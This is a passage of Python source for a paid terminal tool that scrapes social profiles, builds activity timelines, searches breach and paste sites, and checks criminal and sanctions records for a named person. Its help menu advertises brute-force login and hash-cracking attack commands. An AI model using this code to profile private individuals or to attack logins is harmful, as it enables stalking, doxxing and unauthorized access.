        '+51':'Peru','+52':'Mexico','+53':'Cuba','+54':'Argentina',
        '+55':'Brazil','+56':'Chile','+57':'Colombia','+58':'Venezuela',
        '+60':'Malaysia','+61':'Australia','+62':'Indonesia','+63':'Philippines',
        '+64':'New Zealand','+65':'Singapore','+66':'Thailand',
        '+81':'Japan','+82':'South Korea','+84':'Vietnam','+86':'China',
        '+90':'Turkey','+91':'India','+92':'Pakistan','+93':'Afghanistan',
        '+94':'Sri Lanka','+95':'Myanmar','+98':'Iran',
        '+212':'Morocco','+213':'Algeria','+216':'Tunisia','+218':'Libya',
        '+234':'Nigeria','+254':'Kenya','+255':'Tanzania','+256':'Uganda',
        '+380':'Ukraine','+381':'Serbia','+385':'Croatia',
        '+386':'Slovenia','+420':'Czech Republic','+421':'Slovakia',
        '+380':'Ukraine','+972':'Israel','+971':'UAE','+966':'Saudi Arabia',
    }
    country = 'Unknown'
    for code, name in sorted(country_codes.items(), key=lambda x: -len(x[0])):
        if number.startswith(code):
            country = name
            break

    print(f'  {CY}Country   {RST}  {WH}{country}{RST}')
    print(f'  {CY}Format    {RST}  {WH}{number}{RST}')
    print()

    # Free carrier lookup via phone.abstractapi.com (free tier: 250/month)
    p('  ── Carrier & Line Type ──────────────────────────────', DM)
    carrier_found = False
    try:
        # Try AbstractAPI free tier (no key needed for basic lookup)
        r = _req.get(f'https://phonevalidation.abstractapi.com/v1/?api_key=&phone={number}',
                    timeout=8)
        if r.ok:
            d = r.json()
            if d.get('valid'):
                carrier_found = True
                print(f'  {CY}Valid        {RST}  {G}Yes{RST}')
                print(f'  {CY}Carrier      {RST}  {WH}{d.get("carrier","?")}{RST}')
                print(f'  {CY}Line type    {RST}  {WH}{d.get("type","?")}{RST}')
                print(f'  {CY}Location     {RST}  {WH}{d.get("location","?")}{RST}')
    except Exception:
        pass

    if not carrier_found:
        # Fallback: scrape carrier from free public lookup
        try:
            clean_num = number.replace('+','')
            r = _req.get(f'https://www.carrierlookup.com/index.php?number={clean_num}',
                        timeout=8, headers={'User-Agent':'Mozilla/5.0'})
            carrier = re.search(r'Carrier[:\s]+([A-Za-z0-9 ]+)', r.text)
            if carrier:
                print(f'  {CY}Carrier      {RST}  {WH}{carrier.group(1).strip()}{RST}')
                carrier_found = True
        except Exception:
            pass

    if not carrier_found:
        p('  Carrier info unavailable (no free API key configured).', DM)

    print()
    p('  ── Search Links ─────────────────────────────────────', DM)
    print()
    clean = number.replace('+','').replace(' ','')
    search_urls = [
        ('Truecaller',   f'https://www.truecaller.com/search/us/{clean}'),
        ('Sync.me',      f'https://sync.me/search/?number={number}'),
        ('Google',       f'https://google.com/search?q="{number}"'),
        ('Google',       f'https://google.com/search?q="{clean}"'),
        ('WhitePages',   f'https://www.whitepages.com/phone/{clean}'),
        ('SpyDialer',    f'https://spydialer.com/default.aspx?phone={clean}'),
        ('CallerID Test',f'https://www.calleridtest.com/lookup?number={number}'),
    ]
    for name, url in search_urls:
        print(f'  {G}→{RST}  {WH}{name:<16}{RST}  {DM}{url}{RST}')

    print()
    p('  ── Breach Check ─────────────────────────────────────', DM)
    try:
        r = _req.get(f'https://leakcheck.net/api/public?check={number}', timeout=8)
        if r.ok:
            d = r.json()
            if d.get('found', 0) > 0:
                pw(f'  Found in {d["found"]} breach(es).')
            else:
                p('  Not found in known breaches.', G)
        else:
            p('  Breach check unavailable.', DM)
    except Exception:
        p('  Breach check unavailable.', DM)
    print()

# ── TIMELINE ──────────────────────────────────────────────────────────────────
def cmd_timeline(args):
    if not args:
        pb('  Usage: timeline <username>')
        pd('  timeline pavlopanda')
        return

    username = args[0].strip()
    print()
    p(f'  Building timeline for: {username}', CY)
    p('  Scanning activity across platforms...', DM)
    print()

    try:
        import requests as _req
    except ImportError:
        pe('  requests not installed.'); return

    events = []  # (timestamp, platform, content, url)

    # ── GitHub
    p('  Scanning GitHub...', DM)
    try:
        r = _req.get(f'https://api.github.com/users/{username}/events?per_page=30',
                    timeout=8, headers={'User-Agent':'Atomic-OSINT'})
        if r.ok:
            for event in r.json():
                ts   = event.get('created_at','')
                etype= event.get('type','').replace('Event','')
                repo = event.get('repo',{}).get('name','?')
                events.append((ts, 'GitHub', f'{etype} → {repo}',
                               f'https://github.com/{username}'))
            p(f'  GitHub: {len([e for e in events if e[1]=="GitHub"])} events', G)
        else:
            p('  GitHub: not found', DM)
    except Exception:
        p('  GitHub: timeout', DM)

    # ── Reddit
    p('  Scanning Reddit...', DM)
    try:
        r = _req.get(f'https://www.reddit.com/user/{username}/comments.json?limit=25',
                    timeout=8, headers={'User-Agent':'Atomic-OSINT/1.0'})
        if r.ok:
            posts = r.json().get('data',{}).get('children',[])
            for post in posts:
                d    = post.get('data',{})
                ts   = datetime.fromtimestamp(d.get('created_utc',0)).strftime('%Y-%m-%dT%H:%M:%SZ')
                body = d.get('body','')[:60]
                sub  = d.get('subreddit','?')
                events.append((ts, 'Reddit', f'r/{sub}: {body}',
                               f'https://reddit.com/user/{username}'))
            p(f'  Reddit: {len([e for e in events if e[1]=="Reddit"])} comments', G)
        else:
            p('  Reddit: not found', DM)
    except Exception:
        p('  Reddit: timeout', DM)

    # ── HackerNews
    p('  Scanning HackerNews...', DM)
    try:
        r = _req.get(f'https://hacker-news.firebaseio.com/v0/user/{username}.json', timeout=6)
        if r.ok and r.json():
            d = r.json()
            created = datetime.fromtimestamp(d.get('created',0)).strftime('%Y-%m-%dT%H:%M:%SZ')
            karma   = d.get('karma', 0)
            submitted = d.get('submitted', [])
            events.append((created, 'HackerNews', f'Account created — karma: {karma}',
                          f'https://news.ycombinator.com/user?id={username}'))
            p(f'  HackerNews: account found — {len(submitted)} submissions, karma {karma}', G)
        else:
            p('  HackerNews: not found', DM)
    except Exception:
        p('  HackerNews: timeout', DM)

    # ── Twitter/X (public scrape — limited)
    p('  Scanning Twitter/X...', DM)
    try:
        r = _req.get(f'https://nitter.net/{username}/rss',
                    timeout=8, headers={'User-Agent':'Mozilla/5.0'})
        if r.ok and '<item>' in r.text:
            items = re.findall(r'<pubDate>(.*?)</pubDate>.*?<title>(.*?)</title>', r.text, re.DOTALL)
            for ts, title in items[:10]:
                events.append((ts, 'Twitter/X', title.strip()[:60],
                              f'https://twitter.com/{username}'))
            p(f'  Twitter/X: {len([e for e in events if e[1]=="Twitter/X"])} tweets', G)
        else:
            p('  Twitter/X: not found or private', DM)
    except Exception:
        p('  Twitter/X: timeout', DM)

    # Sort and display
    print()
    if not events:
        pe('  No activity found across any platform.')
        return

    # Sort by timestamp descending
    def sort_key(e):
        try:
            return e[0]
        except Exception:
            return ''
    events.sort(key=sort_key, reverse=True)

    p(f'  ── Timeline ({len(events)} events) ──────────────────────────', CY)
    print()
    current_date = ''
    for ts, platform, content, url in events[:50]:
        # Extract date
        try:
            date = ts[:10]
        except Exception:
            date = '????-??-??'
        if date != current_date:
            current_date = date
            print(f'  {YL}▶ {date}{RST}')
        platform_color = {
            'GitHub': G, 'Reddit': RD, 'Twitter/X': CY, 'HackerNews': YL
        }.get(platform, WH)
        print(f'    {platform_color}{platform:<12}{RST}  {WH}{content[:60]}{RST}')
    print()
    p(f'  Earliest activity: {events[-1][0][:10] if events else "?"}', DM)
    p(f'  Latest activity:   {events[0][0][:10] if events else "?"}', DM)
    print()

# ── SOCIALMAP ─────────────────────────────────────────────────────────────────
def cmd_socialmap(args):
    if not args:
        pb('  Usage: socialmap <username|"full name">')
        pd('  socialmap pavlopanda')
        pd('  socialmap "John Smith"')
        return

    target = ' '.join(args).strip().strip('"\'')
    username = target.replace(' ','').lower()
    print()
    p(f'  Target: {target}', CY)
    print()

    try:
        import requests as _req
    except ImportError:
        pe('  requests not installed.'); return

    # ── Instagram (instaloader)
    p('  ── Instagram ────────────────────────────────────────', DM)
    if shutil.which('instaloader'):
        p(f'  Scraping public profile @{username}...', DM)
        shell_exec(f'instaloader --no-pictures --no-videos --no-video-thumbnails '
                   f'--no-geotags --no-captions --no-compress-json '
                   f'--stories profile {username}')
    else:
        # Direct scrape of public profile
        try:
            r = _req.get(f'https://www.instagram.com/{username}/?__a=1&__d=dis',
                        timeout=8, headers={
                            'User-Agent': 'Mozilla/5.0',
                            'Accept': 'application/json'
                        })
            if r.ok and r.json():
                d = r.json().get('graphql',{}).get('user',{})
                if d:
                    print(f'  {G}✓{RST}  {WH}@{username}{RST}')
                    print(f'  {CY}Full name  {RST}  {WH}{d.get("full_name","?")}{RST}')
                    print(f'  {CY}Bio        {RST}  {WH}{d.get("biography","?")[:60]}{RST}')
                    print(f'  {CY}Followers  {RST}  {WH}{d.get("edge_followed_by",{}).get("count","?")}{RST}')
                    print(f'  {CY}Posts      {RST}  {WH}{d.get("edge_owner_to_timeline_media",{}).get("count","?")}{RST}')
                    print(f'  {CY}Private    {RST}  {WH}{d.get("is_private","?")}{RST}')
                else:
                    p('  Profile not found or private.', DM)
            else:
                p(f'  {DM}https://instagram.com/{username}{RST}', '')
                p('  Install instaloader for deep scrape: pip install instaloader', DM)
        except Exception:
            p(f'  {DM}https://instagram.com/{username} — check manually{RST}', '')

    print()

    # ── TikTok
    p('  ── TikTok ───────────────────────────────────────────', DM)
    try:
        r = _req.get(f'https://www.tiktok.com/@{username}',
                    timeout=8, headers={'User-Agent': 'Mozilla/5.0'})
        if r.ok and 'uniqueId' in r.text:
            # Extract basic info from page source
            fans    = re.search(r'"followerCount":(\d+)', r.text)
            likes   = re.search(r'"heartCount":(\d+)', r.text)
            videos  = re.search(r'"videoCount":(\d+)', r.text)
            nick    = re.search(r'"nickname":"([^"]+)"', r.text)
            bio     = re.search(r'"signature":"([^"]*)"', r.text)
            print(f'  {G}✓  @{username} found{RST}')
            if nick:    print(f'  {CY}Name       {RST}  {WH}{nick.group(1)}{RST}')
            if fans:    print(f'  {CY}Followers  {RST}  {WH}{int(fans.group(1)):,}{RST}')
            if likes:   print(f'  {CY}Likes      {RST}  {WH}{int(likes.group(1)):,}{RST}')
            if videos:  print(f'  {CY}Videos     {RST}  {WH}{videos.group(1)}{RST}')
            if bio:     print(f'  {CY}Bio        {RST}  {WH}{bio.group(1)[:60]}{RST}')
        else:
            p(f'  @{username} not found on TikTok.', DM)
    except Exception as e:
        p(f'  TikTok scrape failed: {e}', DM)

    print()

    # ── Facebook
    p('  ── Facebook ─────────────────────────────────────────', DM)
    try:
        r = _req.get(f'https://www.facebook.com/{username}',
                    timeout=8, headers={'User-Agent': 'Mozilla/5.0'})
        if r.ok and 'timeline' in r.text.lower():
            title = re.search(r'<title>([^<]+)</title>', r.text)
            print(f'  {G}✓  Profile found{RST}')
            if title: print(f'  {CY}Title      {RST}  {WH}{title.group(1)}{RST}')
            print(f'  {DM}  https://facebook.com/{username}{RST}')
        else:
            p(f'  Not found: facebook.com/{username}', DM)
    except Exception:
        p(f'  {DM}https://facebook.com/{username} — check manually{RST}', '')
    # Google dork for public FB posts
    print(f'  {G}→{RST}  {DM}google.com/search?q=site:facebook.com+"{target}"{RST}')

    print()

    # ── LinkedIn
    p('  ── LinkedIn ─────────────────────────────────────────', DM)
    try:
        r = _req.get(f'https://www.linkedin.com/in/{username}',
                    timeout=8, headers={'User-Agent': 'Mozilla/5.0'})
        if r.ok and 'profile' in r.text.lower():
            title = re.search(r'<title>([^<]+)</title>', r.text)
            print(f'  {G}✓  Profile found{RST}')
            if title: print(f'  {CY}Title      {RST}  {WH}{title.group(1)[:60]}{RST}')
        else:
            p(f'  Not found: linkedin.com/in/{username}', DM)
    except Exception:
        p(f'  {DM}https://linkedin.com/in/{username} — check manually{RST}', '')
    print(f'  {G}→{RST}  {DM}google.com/search?q=site:linkedin.com+"{target}"{RST}')

    print()

    # ── Snapchat public stories
    p('  ── Snapchat ─────────────────────────────────────────', DM)
    try:
        r = _req.get(f'https://story.snapchat.com/s/{username}',
                    timeout=8, headers={'User-Agent': 'Mozilla/5.0'})
        if r.ok and username.lower() in r.text.lower():
            print(f'  {G}✓  Public story found: story.snapchat.com/s/{username}{RST}')
        else:
            p(f'  No public story: snapchat.com/add/{username}', DM)
    except Exception:
        p(f'  Snapchat check failed.', DM)

    print()

    # ── All other platforms
    p('  ── Other Platforms ──────────────────────────────────', DM)
    print()
    others = {
        'Twitter/X':   f'https://twitter.com/{username}',
        'Reddit':      f'https://reddit.com/user/{username}',
        'YouTube':     f'https://youtube.com/@{username}',
        'Twitch':      f'https://twitch.tv/{username}',
        'GitHub':      f'https://github.com/{username}',
        'Pinterest':   f'https://pinterest.com/{username}',
        'Telegram':    f'https://t.me/{username}',
        'Discord':     f'https://discord.com/users/{username}',
        'Steam':       f'https://steamcommunity.com/id/{username}',
        'Spotify':     f'https://open.spotify.com/user/{username}',
        'Twitch':      f'https://twitch.tv/{username}',
        'Mastodon':    f'https://mastodon.social/@{username}',
        'BeReal':      f'https://bere.al/{username}',
        'Tumblr':      f'https://www.tumblr.com/{username}',
        'Flickr':      f'https://flickr.com/people/{username}',
        'VK':          f'https://vk.com/{username}',
    }
    for name, url in others.items():
        try:
            r = _req.get(url, timeout=4,
                        headers={'User-Agent':'Mozilla/5.0'},
                        allow_redirects=True)
            if r.status_code == 200:
                print(f'  {G}✓{RST}  {WH}{name:<14}{RST}  {DM}{url}{RST}')
            else:
                print(f'  {DM}✗  {name}{RST}')
        except Exception:
            print(f'  {YL}?{RST}  {DM}{name}{RST}')
    print()

# ── RECORDS (public law enforcement databases) ────────────────────────────────
def cmd_records(args):
    if not args:
        pb('  Usage: records <name|username>')
        pd('  records "John Smith"')
        pd('  records pavlopanda')
        return

    target = ' '.join(args).strip().strip('"\'')
    print()
    p(f'  Target: {target}', CY)
    pw('  Searching public law enforcement & government databases...')
    print()

    try:
        import requests as _req
    except ImportError:
        pe('  requests not installed.'); return

    # ── Interpol Red Notices (public API)
    p('  ── Interpol Red Notices ─────────────────────────────', DM)
    try:
        name_parts = target.split()
        params = {'name': target, 'resultPerPage': 10}
        if len(name_parts) >= 2:
            params = {'forename': name_parts[0], 'name': name_parts[-1], 'resultPerPage': 10}
        r = _req.get('https://ws-public.interpol.int/notices/v1/red',
                    params=params, timeout=10,
                    headers={'Accept': 'application/json'})
        if r.ok:
            d = r.json()
            total = d.get('total', 0)
            if total > 0:
                pw(f'  {total} Interpol Red Notice(s) found!')
                for notice in d.get('_embedded', {}).get('notices', []):
                    fname  = notice.get('forename', '')
                    lname  = notice.get('name', '')
                    dob    = notice.get('date_of_birth', '?')
                    nation = ', '.join(notice.get('nationalities', []))
                    link   = notice.get('_links', {}).get('self', {}).get('href', '')
                    print(f'  {RD}●{RST}  {WH}{fname} {lname}{RST}  DOB: {DM}{dob}{RST}  {DM}{nation}{RST}')
                    if link: print(f'     {DM}{link}{RST}')
            else:
                p('  No Interpol Red Notices found.', G)
        else:
            p(f'  Interpol API returned {r.status_code}', DM)
    except Exception as e:
        p(f'  Interpol check failed: {e}', DM)

    print()

    # ── FBI Most Wanted
    p('  ── FBI Most Wanted ──────────────────────────────────', DM)
    try:
        r = _req.get(f'https://api.fbi.gov/wanted/v1/list?title={target.replace(" ","+")}',
                    timeout=10, headers={'Accept': 'application/json'})
        if r.ok:
            d = r.json()
            items = d.get('items', [])
            if items:
                pw(f'  {len(items)} FBI Most Wanted match(es):')
                for item in items[:3]:
                    title   = item.get('title','?')
                    status  = item.get('status','?')
                    charges = ', '.join(item.get('subjects',[]))[:60]
                    url     = item.get('url','')
                    print(f'  {RD}●{RST}  {WH}{title}{RST}')
                    print(f'     {DM}Status: {status}  Charges: {charges}{RST}')
                    if url: print(f'     {DM}{url}{RST}')
            else:
                p('  Not on FBI Most Wanted list.', G)
        else:
            p(f'  FBI API unavailable.', DM)
    except Exception as e:
        p(f'  FBI check failed: {e}', DM)

    print()

    # ── US Sex Offender Registry
    p('  ── US Sex Offender Registry (NSOPW) ─────────────────', DM)
    try:
        name_parts = target.split()
        payload = {
            'firstName': name_parts[0] if name_parts else target,
            'lastName':  name_parts[-1] if len(name_parts) > 1 else '',
        }
        r = _req.post('https://www.nsopw.gov/api/search/osexoffender',
                     json=payload, timeout=10,
                     headers={'Content-Type':'application/json',
                              'User-Agent':'Mozilla/5.0'})
        if r.ok:
            d = r.json()
            count = d.get('count', 0)
            if count > 0:
                pw(f'  {count} match(es) on US Sex Offender Registry.')
                for offender in d.get('offenders', [])[:3]:
                    fn = offender.get('firstName','')
                    ln = offender.get('lastName','')
                    st = offender.get('homeState','')
                    print(f'  {RD}●{RST}  {WH}{fn} {ln}{RST}  {DM}State: {st}{RST}')
            else:
                p('  Not found on US Sex Offender Registry.', G)
        else:
            p('  NSOPW search unavailable.', DM)
    except Exception as e:
        p(f'  NSOPW check failed: {e}', DM)

    print()

    # ── OFAC Sanctions (US Treasury)
    p('  ── OFAC Sanctions List (US Treasury) ────────────────', DM)
    try:
        r = _req.get(f'https://api.ofac.treasury.gov/v1/screening/name?name={target.replace(" ","+")}',
                    timeout=10, headers={'Accept':'application/json'})
        if r.ok:
            d = r.json()
            if d.get('found'):
                pw(f'  FOUND on OFAC Sanctions list!')
                for match in d.get('matches', [])[:3]:
                    print(f'  {RD}●{RST}  {WH}{match.get("name","?")}{RST}  {DM}{match.get("type","?")}{RST}')
            else:
                p('  Not on OFAC Sanctions list.', G)
        else:
            # Fallback — search the public SDN list
            r2 = _req.get('https://www.treasury.gov/ofac/downloads/sdn.csv',
                         timeout=15, stream=True)
            found = False
            for chunk in r2.iter_lines():
                try:
                    line = chunk.decode('utf-8', errors='ignore')
                    if target.lower() in line.lower():
                        found = True
                        pw(f'  Possible match on OFAC SDN list: {line[:100]}')
                except Exception:
                    pass
            if not found:
                p('  Not found on OFAC list.', G)
    except Exception as e:
        p(f'  OFAC check failed: {e}', DM)

    print()

    # ── EU Sanctions
    p('  ── EU Consolidated Sanctions List ───────────────────', DM)
    try:
        r = _req.get('https://webgate.ec.europa.eu/fsd/fsf/public/files/csvFullSanctionsList/content',
                    timeout=15, stream=True)
        if r.ok:
            found_eu = False
            for chunk in r.iter_lines():
                try:
                    line = chunk.decode('utf-8', errors='ignore')
                    if target.lower() in line.lower():
                        found_eu = True
                        pw(f'  Match on EU Sanctions list: {line[:100]}')
                        break
                except Exception:
                    pass
            if not found_eu:
                p('  Not found on EU Sanctions list.', G)
        else:
            p('  EU Sanctions list unavailable.', DM)
    except Exception as e:
        p(f'  EU check failed: {e}', DM)

    print()

    # ── Arrest records (public Google dork)
    p('  ── Public Arrest Records ────────────────────────────', DM)
    encoded = target.replace(' ', '+')
    arrest_sites = [
        f'site:arrests.org "{target}"',
        f'site:mugshots.com "{target}"',
        f'site:vinelink.com "{target}"',
        f'site:court.gov "{target}"',
        f'"{target}" arrest OR convicted OR charged OR indicted',
    ]
    for dork in arrest_sites:
        print(f'  {G}→{RST}  {DM}google.com/search?q={dork.replace(" ","+")}{RST}')

    # ── UN Sanctions
    print()
    p('  ── UN Sanctions List ────────────────────────────────', DM)
    try:
        r = _req.get(f'https://scsanctions.un.org/resources/xml/en/consolidated.xml',
                    timeout=15)
        if r.ok and target.split()[0].lower() in r.text.lower():
            pw(f'  Possible match on UN Sanctions list.')
            lines = [l for l in r.text.split('\n') if target.split()[0].lower() in l.lower()]
            for l in lines[:3]:
                clean = re.sub(r'<[^>]+>', '', l).strip()
                if clean: print(f'  {RD}●{RST}  {DM}{clean[:100]}{RST}')
        else:
            p('  Not found on UN Sanctions list.', G)
    except Exception as e:
        p(f'  UN check failed: {e}', DM)

    # ── UK Sanctions
    print()
    p('  ── UK Sanctions (OFSI) ──────────────────────────────', DM)
    try:
        r = _req.get('https://ofsistorage.blob.core.windows.net/publishlive/2022format/ConList.csv',
                    timeout=15)
        if r.ok:
            found_uk = any(target.lower() in line.lower() for line in r.text.split('\n'))
            if found_uk:
                pw(f'  Match on UK OFSI Sanctions list.')
            else:
                p('  Not on UK Sanctions list.', G)
        else:
            p('  UK sanctions list unavailable.', DM)
    except Exception as e:
        p(f'  UK check: {e}', DM)

    # ── News search
    print()
    p('  ── News & Media ─────────────────────────────────────', DM)
    try:
        encoded = target.replace(' ', '+')
        r = _req.get(
            f'https://newsapi.org/v2/everything?q={encoded}&sortBy=relevancy&pageSize=5&apiKey=demo',
            timeout=8)
        if r.ok and r.json().get('articles'):
            articles = r.json()['articles']
            p(f'  {len(articles)} news article(s) found:', CY)
            for a in articles[:5]:
                title  = a.get('title','?')[:60]
                source = a.get('source',{}).get('name','?')
                date   = a.get('publishedAt','')[:10]
                url    = a.get('url','')
                print(f'  {G}[{source}]{RST}  {WH}{title}{RST}  {DM}{date}{RST}')
                print(f'  {DM}  {url}{RST}')
        else:
            # Fallback Google News dork
            p('  Google News dork:', DM)
            print(f'  {G}→{RST}  {DM}news.google.com/search?q={encoded}{RST}')
            print(f'  {G}→{RST}  {DM}google.com/search?q="{target}"+news{RST}')
    except Exception:
        print(f'  {G}→{RST}  {DM}news.google.com/search?q={target.replace(" ","+")}{RST}')

    # ── Wikipedia
    print()
    p('  ── Wikipedia ────────────────────────────────────────', DM)
    try:
        r = _req.get(
            f'https://en.wikipedia.org/api/rest_v1/page/summary/{target.replace(" ","_")}',
            timeout=8)
        if r.ok and r.json().get('extract'):
            d = r.json()
            print(f'  {G}✓  Wikipedia page found{RST}')
            print(f'  {WH}{d.get("extract","")[:200]}...{RST}')
            print(f'  {DM}  {d.get("content_urls",{}).get("desktop",{}).get("page","")}{RST}')
        else:
            p('  No Wikipedia page found.', DM)
    except Exception:
        p('  Wikipedia check failed.', DM)

    # ── Wikidata
    print()
    p('  ── Wikidata ─────────────────────────────────────────', DM)
    try:
        r = _req.get(
            f'https://www.wikidata.org/w/api.php?action=wbsearchentities&search={target.replace(" ","+")}&language=en&format=json',
            timeout=8)
        if r.ok:
            results = r.json().get('search', [])
            if results:
                for item in results[:3]:
                    label = item.get('label','?')
                    desc  = item.get('description','')[:60]
                    qid   = item.get('id','')
                    print(f'  {G}[{qid}]{RST}  {WH}{label}{RST}  {DM}{desc}{RST}')
            else:
                p('  Not found on Wikidata.', DM)
    except Exception:
        p('  Wikidata check failed.', DM)

    # ── WhatsApp (public status check)
    print()
    p('  ── WhatsApp ─────────────────────────────────────────', DM)
    p('  WhatsApp has no public profile API.', DM)
    p('  If you have their number use: track <number>', DM)

    # ── Telegram public channels/users
    print()
    p('  ── Telegram ─────────────────────────────────────────', DM)
    try:
        r = _req.get(f'https://t.me/{username}',
                    timeout=8, headers={'User-Agent':'Mozilla/5.0'})
        if r.ok and 'tgme_page_title' in r.text:
            title = re.search(r'class="tgme_page_title"[^>]*><span>([^<]+)</span>', r.text)
            desc  = re.search(r'class="tgme_page_description"[^>]*>(.*?)</div>', r.text, re.DOTALL)
            members = re.search(r'(\d[\d\s]+)(members|subscribers)', r.text)
            print(f'  {G}✓  @{username} found on Telegram{RST}')
            if title:   print(f'  {CY}Name       {RST}  {WH}{title.group(1)}{RST}')
            if members: print(f'  {CY}Members    {RST}  {WH}{members.group(1).strip()}{RST}')
            if desc:
                clean = re.sub(r'<[^>]+>','',desc.group(1)).strip()[:80]
                if clean: print(f'  {CY}Bio        {RST}  {WH}{clean}{RST}')
        else:
            p(f'  @{username} not found on Telegram.', DM)
    except Exception:
        p('  Telegram check failed.', DM)

    # ── YouTube
    print()
    p('  ── YouTube ──────────────────────────────────────────', DM)
    try:
        r = _req.get(f'https://www.youtube.com/@{username}',
                    timeout=8, headers={'User-Agent':'Mozilla/5.0'})
        if r.ok and 'channelId' in r.text:
            subs  = re.search(r'"subscriberCountText".*?"simpleText":"([^"]+)"', r.text)
            vids  = re.search(r'"videoCountText".*?"runs":\[.*?"text":"([^"]+)"', r.text)
            cname = re.search(r'"title":"([^"]+)","description"', r.text)
            print(f'  {G}✓  @{username} found on YouTube{RST}')
            if cname: print(f'  {CY}Channel    {RST}  {WH}{cname.group(1)}{RST}')
            if subs:  print(f'  {CY}Subscribers{RST}  {WH}{subs.group(1)}{RST}')
            if vids:  print(f'  {CY}Videos     {RST}  {WH}{vids.group(1)}{RST}')
        else:
            p(f'  @{username} not found on YouTube.', DM)
    except Exception:
        p('  YouTube check failed.', DM)

    # ── Pastebin / paste sites leak search
    print()
    p('  ── Paste Sites & Data Leaks ─────────────────────────', DM)
    paste_sites = [
        ('Pastebin',   f'https://pastebin.com/search?q={target.replace(" ","+")}'),
        ('Ghostbin',   f'https://ghostbin.co/search?query={target.replace(" ","+")}'),
        ('Riseup',     f'https://pad.riseup.net/search?query={target.replace(" ","+")}'),
        ('IntelX',     f'https://intelx.io/?s={target.replace(" ","+")}'),
        ('Dehashed',   f'https://dehashed.com/search?query={target.replace(" ","+")}'),
        ('LeakCheck',  f'https://leakcheck.net/?query={target.replace(" ","+")}'),
    ]
    for name, url in paste_sites:
        print(f'  {G}→{RST}  {WH}{name:<12}{RST}  {DM}{url}{RST}')

    print()
    p('  ── Summary ──────────────────────────────────────────', CY)
    print()
    p('  Public databases checked:', G)
    checks = [
        'Interpol Red Notices','FBI Most Wanted','US Sex Offender Registry',
        'OFAC Sanctions (US)','EU Sanctions','UN Sanctions','UK Sanctions (OFSI)',
        'News & Media','Wikipedia','Wikidata','Telegram','YouTube','Paste sites'
    ]
    for c in checks:
        print(f'  {G}✓{RST}  {DM}{c}{RST}')
    print()
    p('  Not accessible (law enforcement only, air-gapped):', RD)
    for c in ['NCIC (US)', 'PNC (UK)', 'EUROPOL internal', 'Interpol I-24/7']:
        print(f'  {RD}✗{RST}  {DM}{c}{RST}')
    print()

def cmd_run(args):
    """Max-only: run any system command."""
    if SESSION['plan'] != 'max' and SESSION['role'] != 'dev':
        pe('  Direct shell access requires Max plan.')
        return
    if not args:
        pb('  Usage: run <command> [args...]')
        return
    pw('  ⚠  You are solely responsible for all actions taken.')
    run_tool(args)

def cmd_whoami(args):
    plan = SESSION['plan']
    role = SESSION['role']
    if role == 'dev':
        badge = f'{PK}★ DEV{RST}'
    elif role == 'admin':
        badge = f'{RD}★ ADMIN{RST}'
    elif plan == 'max':
        badge = f'{YL}⚡ MAX{RST}'
    elif plan == 'pro':
        badge = f'{CY}● PRO{RST}'
    else:
        badge = f'{DM}○ FREE{RST}'
    print()
    print(f'  {CY}User       {RST}  {WH}{SESSION["displayName"]}{RST}')
    print(f'  {CY}Plan       {RST}  {badge}')
    print(f'  {CY}Role       {RST}  {WH}{role}{RST}')
    print(f'  {CY}OS         {RST}  {WH}{platform.platform()}{RST}')
    print(f'  {CY}Python     {RST}  {WH}{sys.version.split()[0]}{RST}')
    print(f'  {CY}Session    {RST}  {WH}{datetime.now().strftime("%Y-%m-%d %H:%M")}{RST}')
    print()

def cmd_status(args):
    plan = SESSION['plan']
    role = SESSION['role']
    limits = {
        'pro': 'Unlimited scans · All tools · Atomic AI',
        'max': 'Unlimited everything · Direct shell · Priority AI',
        'dev': 'Full access · All tools · Direct shell · Atomic AI',
    }
    display = 'DEV' if role == 'dev' else 'ADMIN' if role == 'admin' else plan.upper()
    access = limits.get(role if role in ('dev','admin') else plan, 'Standard access')
    print()
    print(f'  {CY}Plan     {RST}  {WH}{display}{RST}')
    print(f'  {CY}Access   {RST}  {WH}{access}{RST}')
    print()

def cmd_help(args):
    plan = SESSION['plan']
    role = SESSION['role']
    is_pro = plan in ('pro','max') or role == 'dev'
    is_max = plan == 'max' or role == 'dev'

    print()
    print(f'{G}{"─"*62}{RST}')
    print(f'{G}  ATOMIC TERMINAL v{VERSION}             Built by Pavlopanda{RST}')
    print(f'{G}{"─"*62}{RST}')
    print()

    def section(title, rows, gated=False):
        tag = f'  {DM}[{"PRO" if gated == "pro" else "MAX"}]{RST}' if gated else ''
        print(f'  {CY}{title}{RST}{tag}')
        for cmd_str, desc in rows:
            print(f'    {G}{cmd_str:<38}{RST}{DM}{desc}{RST}')
        print()

    section('GENERAL', [
        ('help',             'Show this menu'),
        ('whoami',           'Session info'),
        ('status',           'Plan & limits'),
        ('clear',            'Clear screen'),
        ('exit',             'Exit Atomic'),
    ])
    section('AI', [
        ('<anything>',       'Just type — Atomic AI answers'),
        ('reset',            'Reset AI conversation history'),
    ])
    section('NETWORK' + ('' if is_pro else '  — requires Pro'), [
        ('myip',             'Show local + public IP'),
        ('ping <host>',      'Ping a host'),
        ('trace <host>',     'Traceroute to host'),
        ('scan <host> [ports]', 'Fast port scanner (built-in)'),
        ('banner <host> <port>', 'Grab service banner'),
        ('dig <domain> [type]',  'DNS lookup'),
        ('whois <target>',       'WHOIS lookup'),
    ])
    section('RECON & OSINT' + ('' if is_pro else '  — requires Pro'), [
        ('netscan',                    'Scan local network — all devices + ports'),
        ('osint <user|email|domain>',  'Full OSINT — socials, DNS, breaches, WHOIS'),
        ('monitor',                    'Live network monitor — watch joins/leaves'),
        ('wifi',                       'Scan nearby WiFi networks'),
        ('vpncheck',                   'Check VPN + DNS leak detection'),
        ('darkweb <query>',            'Search Tor hidden services (requires Tor)'),
        ('exploit <CVE-ID>',           'CVE details + public exploit lookup'),
        ('cve <software> [version]',   'Search all CVEs for a software'),
        ('sniff',                      'Capture live network packets'),
        ('facesearch <image>',         'Reverse face search — Google/Bing/Yandex/Tor'),
        ('lookup <name|email>',        'Full person lookup — socials/breaches/pastes'),
        ('socialmap <username>',       'Deep scan — Instagram/TikTok/Facebook/Snap/16+ platforms'),
        ('records <name>',             'Public law databases — Interpol/FBI/OFAC/EU/UN/news'),
        ('track <phone>',              'Phone number OSINT — carrier/country/breaches'),
        ('timeline <username>',        'Activity timeline across GitHub/Reddit/Twitter'),
        ('hashid <hash>',              'Identify hash type + hashcat mode'),
        ('decode <string>',            'Decode base64/hex/JWT/binary/URL/ROT13'),
    ])
    section('ATTACK TOOLS' + ('' if is_pro else '  — requires Pro'), [
        ('crack <hash>',               'Auto-detect & crack any hash'),
        ('brutelogin <url>',           'Brute-force any login page'),
